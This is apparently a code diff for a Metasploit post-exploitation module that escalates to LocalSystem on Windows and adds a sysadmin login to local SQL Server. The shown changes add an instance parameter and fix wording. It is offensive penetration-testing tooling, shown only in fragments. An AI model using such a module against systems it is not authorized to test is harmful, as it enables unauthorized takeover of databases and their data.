@@ -9,11 +9,11 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 				'Name'          => 'SQL Server - Local Authorization Bypass',
 				'Description'   => %q{ When this module is executed via an existing 
-				meterpreter session it can used to gain unauthorized access to local 
+				meterpreter session it can be used to gain unauthorized access to local 
 				SQL Server instances.  It first obtains LocalSystem privileges 
 				using the "getsystem" escalation methods. Then, it adds a sysadmin 
 				login to the local SQL Server using native SQL clients and stored
-				procedures.  
+				procedures.  If no intance is specified the default will be used.  
 				
 				This is possible because LocalSystem has syadmin privileges in all 
 				versions of SQL Server (2k8 and prior) by default in order to manage 
@@ -36,8 +36,7 @@ class Metasploit3 < Msf::Post
 	end
 	
 	# TODO
-	# - add remove login
-	# - add instance option
+	# - finalize instance option so it is used when adding login	
 
 	def run
 			
@@ -71,12 +70,12 @@ class Metasploit3 < Msf::Post
 											
 						# Add new login
 						print_status("Attempting to add new login #{datastore['DB_USERNAME']}...") if verbose == "true"
-						add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)
+						add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,verbose)
 						if add_login_status == 1
 							
 							# Add login to sysadmin fixed server role
 							print_status("Attempting to make #{datastore['DB_USERNAME']} login a sysadmin...") if verbose == "true"
-							add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)				
+							add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,verbose)				
 						end
 					else
 						
@@ -171,7 +170,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	## Method for adding a login
-	def add_sql_login(sqlclient,dbuser,dbpass,verbose)
+	def add_sql_login(sqlclient,dbuser,dbpass,instance,verbose)
 		
 		# Display debugging information
 		print_status("Settings:") if verbose == "true" 
@@ -212,7 +211,7 @@ class Metasploit3 < Msf::Post
 	end
 	
 	# Method for adding a login to sysadmin role
-	def add_sysadmin(sqlclient,dbuser,dbpass,verbose)
+	def add_sysadmin(sqlclient,dbuser,dbpass,instance,verbose)
 	
 		# Display debugging information
 		print_status("Settings:") if verbose == "true" 
